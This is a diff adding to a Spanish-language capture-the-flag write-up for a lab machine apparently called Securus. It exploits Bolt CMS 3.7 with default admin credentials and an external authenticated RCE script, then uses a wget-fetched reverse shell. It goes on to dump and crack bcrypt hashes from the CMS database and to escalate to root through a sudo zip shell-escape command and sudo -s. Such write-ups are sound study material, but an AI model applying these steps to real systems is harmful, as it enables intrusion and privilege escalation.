@@ -22,4 +22,38 @@ Bolt CMS 3.6.6 - Cross-Site Request Forgery / Remote Code Execution             
 Bolt CMS 3.7.0 - Authenticated Remote Code Execution                                                             | php/webapps/48296.py
 Bolt CMS < 3.6.2 - Cross-Site Scripting                                                                          | php/webapps/46014.txt
 ```
-No tenemos creds pero admin:pasword funcionan perfectamente en el endpoint de administración, gracias a ello sabemos que la versión es la 3.7
+No tenemos creds pero admin:pasword funcionan perfectamente en el endpoint de administración, gracias a ello sabemos que la versión es la 3.7, probemos esta version del script para la 3.7 (la de exploitdb no va bien)
+```
+https://raw.githubusercontent.com/r3m0t3nu11/Boltcms-Auth-rce-py/master/exploit.py
+```
+El handler del exploit falla mas que una escopeta de feria pero te sube una reverse shell usable en cada uno de los test, que podemos usar sin el propio script, una vez tenemos un test vamos a el mismo y obtenemos mediante la ejecucion de wget una reverse shell completa.
+
+## Privesc
+### Willec 
+Enumerando encontramos la base de datos de bolt manejamos esa mediante sqlite y hacemos la siguiente querry:
+```
+1|admin|$2y$10$lFIIlzYOrJMHbLZB.kVS2eF4Iezyrt/FfyZqDd0ZukJ7IGKtLUf16||0|a@a.com|2020-09-14 01:10:52|192.168.100.1|[]|1|||||["root","everyone"]
+2|wildone|$2y$10$ZZqbTKKlgDnCMvGD2M0SxeTS3GPSCljXWtd172lI2zj3p6bjOCGq.|Wile E Coyote|0|wild@one.com|2020-04-25 16:03:44|192.168.100.1|[]|1|||||["editor"]
+```
+Si crackeamos la pass de wildone es snickers, esta pass es valida para el usuario wileec en la máquina , podemos hacer su a este y usar su clave ssh para conectarnos a la IP que tenemos de la db
+### jsmith
+```
+User wileec may run the following commands on Securus:
+    (jsmith) NOPASSWD: /usr/bin/zip
+```
+Ejecutamos lo siguiente:
+```
+TF=$(mktemp -u)
+sudo -u jsmith zip $TF /etc/hosts -T -TT 'sh #'
+```
+Y ya tenemos shell como jsmith
+### Root
+```
+User jsmith may run the following commands on Securus:
+    (ALL : ALL) NOPASSWD: ALL
+```
+Ejecutamos esto:
+```
+sudo -s
+```
+Y ya tenemos shell como root
